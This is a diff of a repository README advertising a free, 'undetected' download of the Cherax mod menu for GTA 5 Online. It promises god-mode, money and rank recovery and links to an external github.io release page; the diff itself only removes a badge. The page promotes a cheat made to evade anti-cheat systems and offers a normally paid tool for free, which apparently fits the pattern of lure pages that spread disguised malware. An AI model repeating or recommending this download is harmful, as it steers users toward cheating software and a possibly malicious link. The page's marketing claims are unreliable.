@@ -1,8 +1,6 @@
 
 # Cherax Mod Menu GTA 5 Online 2025 – FREE DOWNLOAD (Undetected PC 1.74)
 
-![Downloads %)K](https://img.shields.io/badge/Downloads-50K/style?=for-the-badge)
-
 Welcome to the repository for the ultimate **cherax mod menu gta 5**. This project provides a robust, external tool designed to enhance your Los Santos experience, solving the endless grind for money and protecting you from malicious modders. Whether you are looking to recover your account rank or simply enjoy the sandbox with god-mode capabilities, Cherax offers a premium experience without the premium price tag.
 
 ## [📥 Download Latest Release](https://cherax-mod.github.io/cherax-mod-menu/)
